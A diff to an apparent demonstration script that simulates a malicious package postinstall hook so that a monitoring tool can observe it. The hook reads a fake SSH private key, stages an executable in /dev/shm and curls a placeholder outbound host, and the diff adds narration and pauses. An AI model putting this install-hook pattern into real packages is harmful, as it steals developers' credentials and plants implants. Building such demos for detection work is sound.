@@ -22,6 +22,12 @@ FAKE_HOME="$DEMO_DIR/home"
 STAGED=/dev/shm/.update-cache
 EXFIL_HOST="${EXFIL_HOST:-example.com}"
 
+# Seconds to pause between the payload's steps. The attack itself takes about a
+# tenth of a second, which is unwatchable when someone is narrating it — the
+# pause spreads the five events out so each one can be pointed at as it lands.
+# Set STEP_PAUSE=0 for automated runs where nobody is watching.
+STEP_PAUSE="${STEP_PAUSE:-1}"
+
 cleanup() {
     rm -rf "$DEMO_DIR" "$STAGED"
 }
@@ -42,13 +48,18 @@ chmod 600 "$FAKE_HOME/.ssh/id_rsa"
 cat > "$PKG_DIR/postinstall.sh" <<PAYLOAD
 #!/bin/sh
 # Step 2: read the developer's SSH private key  -> file/secret_read
+echo "    [payload] reading ~/.ssh/id_rsa"
 cat "$FAKE_HOME/.ssh/id_rsa" > /dev/null
+sleep $STEP_PAUSE
 
 # Step 3: stage a payload in shared memory      -> file/write
+echo "    [payload] staging an implant in /dev/shm"
 echo "staged-implant-bytes" > "$STAGED"
 chmod +x "$STAGED"
+sleep $STEP_PAUSE
 
 # Steps 4+5: exec curl, which connects outbound -> exec + net
+echo "    [payload] calling home to $EXFIL_HOST"
 curl -s -o /dev/null --max-time 5 "http://$EXFIL_HOST/" || true
 PAYLOAD
 chmod +x "$PKG_DIR/postinstall.sh"
